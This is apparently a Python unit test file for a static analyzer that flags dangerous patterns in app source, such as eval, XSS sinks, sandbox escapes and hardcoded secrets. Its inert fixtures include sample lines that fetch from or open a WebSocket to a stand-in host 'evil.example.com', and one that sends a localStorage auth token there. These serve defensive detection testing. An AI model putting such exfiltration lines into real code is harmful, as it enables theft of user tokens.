"""Unit tests for tinyagentos/code_analyzer.py.

One positive (trips the detector) and one negative (clean, does not trip)
sample per detector, plus a few tests for the analyze_app_source aggregator.

NOTE: fixtures below contain literal strings like "eval(...)" and fake
secret-shaped literals (e.g. "AKIAIOSFODNN7EXAMPLE") purely as inert text
passed to the analyzer for pattern matching -- none of it is ever executed,
and none of the "secrets" are real credentials.
"""

from __future__ import annotations

from tinyagentos import code_analyzer
from tinyagentos.code_analyzer import (
    Finding,
    adversarial_verify,
    analyze_app_source,
    detect_dangerous_url_scheme,
    detect_dom_xss_sink,
    detect_eval_like,
    detect_hardcoded_secrets,
    detect_inline_event_handler_injection,
    detect_network_exfil,
    detect_postmessage_no_origin_check,
    detect_sandbox_escape,
    detect_storage_exfil,
    has_critical,
)


# --------------------------------------------------------------------------- #
# detect_eval_like
# --------------------------------------------------------------------------- #


class TestEvalLike:
    def test_eval_call_trips(self):
        findings = detect_eval_like("app.js", "eval(userInput);")
        assert len(findings) == 1
        assert findings[0].rule_id == "eval-like-execution"
        assert findings[0].severity == "critical"

    def test_new_function_trips(self):
        findings = detect_eval_like("app.js", "const f = new Function('return 1');")
        assert len(findings) == 1

    def test_settimeout_string_trips(self):
        findings = detect_eval_like("app.js", 'setTimeout("doEvil()", 100);')
        assert len(findings) == 1

    def test_clean_code_does_not_trip(self):
        content = (
            "function evaluate(x) { return x * 2; }\n"
            "mathObj.eval(expr);\n"
            "setTimeout(doSomething, 100);\n"
        )
        assert detect_eval_like("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_network_exfil
# --------------------------------------------------------------------------- #


class TestNetworkExfil:
    def test_absolute_fetch_trips(self):
        findings = detect_network_exfil("app.js", 'fetch("https://evil.example.com/steal");')
        assert len(findings) == 1
        assert findings[0].rule_id == "network-exfil"
        assert findings[0].severity == "critical"

    def test_websocket_to_external_host_trips(self):
        findings = detect_network_exfil("app.js", 'new WebSocket("wss://evil.example.com/ws");')
        assert len(findings) == 1

    def test_relative_fetch_does_not_trip(self):
        content = 'fetch("/api/userspace-apps/test-app/broker");'
        assert detect_network_exfil("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_dom_xss_sink
# --------------------------------------------------------------------------- #


class TestDomXssSink:
    def test_dynamic_innerhtml_trips(self):
        findings = detect_dom_xss_sink("app.js", 'el.innerHTML = "<b>" + userInput + "</b>";')
        assert len(findings) == 1
        assert findings[0].rule_id == "dom-xss-sink"
        assert findings[0].severity == "critical"

    def test_document_write_with_concat_trips(self):
        findings = detect_dom_xss_sink("app.js", 'document.write("<p>" + name + "</p>")')
        assert len(findings) == 1

    def test_static_innerhtml_does_not_trip(self):
        content = 'el.innerHTML = "<b>Static text</b>";'
        assert detect_dom_xss_sink("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_dangerous_url_scheme
# --------------------------------------------------------------------------- #


class TestDangerousUrlScheme:
    def test_javascript_scheme_trips(self):
        findings = detect_dangerous_url_scheme("app.js", 'const link = "javascript:alert(1)";')
        assert len(findings) == 1
        assert findings[0].rule_id == "dangerous-url-scheme"
        assert findings[0].severity == "critical"

    def test_data_text_html_scheme_trips(self):
        findings = detect_dangerous_url_scheme(
            "app.js", 'frame.src = "data:text/html,<script>alert(1)</script>";'
        )
        assert len(findings) == 1

    def test_normal_url_does_not_trip(self):
        content = 'const link = "https://example.com";'
        assert detect_dangerous_url_scheme("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_inline_event_handler_injection
# --------------------------------------------------------------------------- #


class TestInlineEventHandlerInjection:
    def test_set_attribute_on_handler_trips(self):
        findings = detect_inline_event_handler_injection(
            "app.js", 'btn.setAttribute("onclick", handlerCode);'
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "inline-event-handler-injection"
        assert findings[0].severity == "critical"

    def test_interpolated_inline_handler_trips(self):
        content = 'const html = `<button onclick="alert(${msg})">Click</button>`;'
        findings = detect_inline_event_handler_injection("app.js", content)
        assert len(findings) == 1

    def test_static_inline_handler_does_not_trip(self):
        content = "const html = '<button onclick=\"doThing()\">Click</button>';"
        assert detect_inline_event_handler_injection("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_hardcoded_secrets
# --------------------------------------------------------------------------- #


class TestHardcodedSecrets:
    def test_aws_key_trips(self):
        findings = detect_hardcoded_secrets("app.js", 'const key = "AKIAIOSFODNN7EXAMPLE";')
        assert len(findings) == 1
        assert findings[0].rule_id == "hardcoded-secret"
        assert findings[0].severity == "critical"

    def test_generic_api_key_assignment_trips(self):
        findings = detect_hardcoded_secrets(
            "app.js", 'const apiKey = "sk_live_abcdef1234567890ZZ";'
        )
        assert len(findings) == 1

    def test_plain_text_mention_does_not_trip(self):
        content = 'const message = "please enter your api key in settings";'
        assert detect_hardcoded_secrets("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_sandbox_escape
# --------------------------------------------------------------------------- #


class TestSandboxEscape:
    def test_window_top_access_trips(self):
        findings = detect_sandbox_escape("app.js", 'window.top.location = "http://evil.example.com";')
        assert len(findings) == 1
        assert findings[0].rule_id == "sandbox-escape-attempt"
        assert findings[0].severity == "critical"

    def test_window_parent_access_trips(self):
        findings = detect_sandbox_escape("app.js", "window.parent.postMessage(data, '*');")
        assert len(findings) == 1

    def test_unrelated_local_variable_does_not_trip(self):
        content = "const parent = getParentElement();\nconsole.log(parent.id);\n"
        assert detect_sandbox_escape("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_postmessage_no_origin_check
# --------------------------------------------------------------------------- #


class TestPostMessageNoOriginCheck:
    def test_wildcard_target_origin_trips(self):
        findings = detect_postmessage_no_origin_check(
            "app.js", 'otherWindow.postMessage(data, "*");'
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "postmessage-no-origin-check"
        assert findings[0].severity == "critical"

    def test_listener_without_origin_check_trips(self):
        content = (
            'window.addEventListener("message", function(event) {\n'
            "  doSomething(event.data);\n"
            "});\n"
        )
        findings = detect_postmessage_no_origin_check("app.js", content)
        assert len(findings) == 1

    def test_listener_with_origin_check_does_not_trip(self):
        content = (
            'window.addEventListener("message", function(event) {\n'
            '  if (event.origin !== "https://trusted.example.com") return;\n'
            "  doSomething(event.data);\n"
            "});\n"
        )
        assert detect_postmessage_no_origin_check("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_storage_exfil
# --------------------------------------------------------------------------- #


class TestStorageExfil:
    def test_storage_read_near_network_call_trips(self):
        content = (
            'const token = localStorage.getItem("authToken");\n'
            'fetch("https://evil.example.com/collect?t=" + token);\n'
        )
        findings = detect_storage_exfil("app.js", content)
        assert len(findings) == 1
        assert findings[0].rule_id == "storage-exfil"
        assert findings[0].severity == "critical"

    def test_storage_read_without_network_call_does_not_trip(self):
        content = (
            'const token = localStorage.getItem("authToken");\n'
            "console.log(token);\n"
        )
        assert detect_storage_exfil("app.js", content) == []


# --------------------------------------------------------------------------- #
# analyze_app_source aggregation
# --------------------------------------------------------------------------- #


class TestAnalyzeAppSource:
    def test_empty_files_returns_no_findings(self):
        assert analyze_app_source({}) == []

    def test_clean_app_returns_no_findings(self):
        files = {
            "index.html": "<html><body><h1>Hello</h1></body></html>",
            "app.js": 'console.log("hello world");',
            "style.css": "body { margin: 0; }",
        }
        assert analyze_app_source(files) == []

    def test_multiple_files_are_all_scanned(self):
        files = {
            "index.html": "<html></html>",
            "app.js": "eval(userInput);",
        }
        findings = analyze_app_source(files)
        assert len(findings) == 1
        assert findings[0].file == "app.js"

    def test_has_critical_true_when_critical_present(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        assert has_critical(findings) is True

    def test_has_critical_false_when_only_warnings(self):
        findings = [Finding("warning", "some-rule", "app.js", 1, "msg")]
        assert has_critical(findings) is False

    def test_finding_to_dict_shape(self):
        f = Finding("critical", "eval-like-execution", "app.js", 3, "msg")
        d = f.to_dict()
        assert d == {
            "severity": "critical",
            "rule_id": "eval-like-execution",
            "file": "app.js",
            "line": 3,
            "message": "msg",
        }


# --------------------------------------------------------------------------- #
# adversarial_verify
# --------------------------------------------------------------------------- #


class TestAdversarialVerify:
    def test_comment_line_is_refuted(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": "// eval(userInput);"})
        assert result == []

    def test_block_comment_start_is_refuted(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": "/* eval(userInput); */"})
        assert result == []

    def test_string_literal_is_refuted(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": 'const msg = "eval() is bad";'})
        assert result == []

    def test_real_code_is_kept(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": "eval(userInput);"})
        assert len(result) == 1

    def test_known_example_key_is_refuted(self):
        findings = [Finding("critical", "hardcoded-secret", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": 'const key = "AKIAIOSFODNN7EXAMPLE";'})
        assert result == []

    def test_multiple_findings_mixed(self):
        findings = [
            Finding("critical", "eval-like-execution", "app.js", 1, "msg"),
            Finding("critical", "hardcoded-secret", "app.js", 2, "msg"),
            Finding("critical", "eval-like-execution", "app.js", 3, "msg"),
        ]
        files = {
            "app.js": (
                "// eval(userInput);\n"
                'const key = "AKIAIOSFODNN7EXAMPLE";\n'
                "eval(userInput);\n"
            ),
        }
        result = adversarial_verify(findings, files)
        assert len(result) == 1
        assert result[0].line == 3

    def test_unknown_rule_id_is_kept(self):
        findings = [Finding("critical", "unknown-rule", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": "some code here"})
        assert len(result) == 1

    def test_missing_file_line_drops_finding(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 99, "msg")]
        result = adversarial_verify(findings, {"app.js": "eval(userInput);"})
        assert result == []

    def test_inline_comment_suppresses_eval_finding(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": "const note = 1; // eval(userInput);"})
        assert result == []

    def test_multiline_block_comment_continuation_suppresses_finding(self):
        findings = [
            Finding("critical", "eval-like-execution", "app.js", 2, "msg"),
        ]
        files = {
            "app.js": (
                "/* eval(userInput);\n"
                "  more comment text\n"
            ),
        }
        result = adversarial_verify(findings, files)
        assert result == []

    def test_hardcoded_secret_inside_string_is_kept(self):
        findings = detect_hardcoded_secrets("app.js", 'const key = "AKIAABCDEFGHIJKLMNOP";')
        result = adversarial_verify(findings, {"app.js": 'const key = "AKIAABCDEFGHIJKLMNOP";'})
        assert len(result) == 1

    def test_websocket_after_inert_fetch_is_kept(self):
        content = 'const url = "fetch(\'http://example.com\')"; new WebSocket("wss://evil.example.com/ws");'
        findings = detect_network_exfil("app.js", content)
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1
        assert result[0].rule_id == "network-exfil"

    def test_eval_after_string_with_escaped_quote_is_kept(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": 'const label = "it\\\'s safe"; eval(userInput);'})
        assert len(result) == 1

    def test_eval_inside_backtick_is_dropped(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": 'const msg = `eval(userInput)`;'})
        assert result == []

    def test_eval_after_nested_quotes_is_kept(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": """const msg = "He said 'hello'"; eval(userInput);"""})
        assert len(result) == 1

    def test_eval_inside_block_comment_on_same_line_is_dropped(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        result = adversarial_verify(findings, {"app.js": "const note = 1; /* eval(userInput) */;"})
        assert result == []

    def test_eval_after_closed_block_comment_on_same_line_is_kept(self):
        content = "/* note */ eval(userInput);"
        findings = detect_eval_like("app.js", content)
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1

    def test_eval_before_block_comment_on_same_line_is_kept(self):
        content = "eval(userInput); /* end */"
        findings = detect_eval_like("app.js", content)
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1

    def test_block_comment_open_inside_string_does_not_mask_later_lines(self):
        content = 'const s = "/*";\neval(userInput);\n'
        findings = detect_eval_like("app.js", content)
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1
        assert result[0].line == 2

    def test_block_comment_open_after_line_comment_does_not_mask_later_lines(self):
        content = "const n = 1; // /*\neval(userInput);\n"
        findings = detect_eval_like("app.js", content)
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1
        assert result[0].line == 2

    def test_block_comment_mask_is_built_once_per_file(self, monkeypatch):
        calls: list[int] = []
        real = code_analyzer._compute_block_comment_mask

        def counting(lines):
            calls.append(len(lines))
            return real(lines)

        monkeypatch.setattr(code_analyzer, "_compute_block_comment_mask", counting)
        content = "eval(a);\neval(b);\neval(c);\n"
        findings = detect_eval_like("app.js", content)
        assert len(findings) == 3
        code_analyzer.adversarial_verify(findings, {"app.js": content})
        assert len(calls) == 1

    def test_match_span_starting_at_column_zero_is_used(self):
        # `new Function(` starts at offset 0; the trigger-token fallback finds
        # the later `eval(` inside the line comment and refutes the finding.
        content = "new Function(x); // eval(y)"
        findings = [f for f in detect_eval_like("app.js", content) if f.match_start == 0]
        assert len(findings) == 1
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1

    def test_real_key_beside_example_key_on_same_line_is_kept(self):
        content = 'const demo = "AKIAIOSFODNN7EXAMPLE"; const real = "AKIAABCDEFGHIJKLMNOP";'
        findings = detect_hardcoded_secrets("app.js", content)
        result = adversarial_verify(findings, {"app.js": content})
        assert len(result) == 1
        assert content[result[0].match_start:result[0].match_end] == "AKIAABCDEFGHIJKLMNOP"
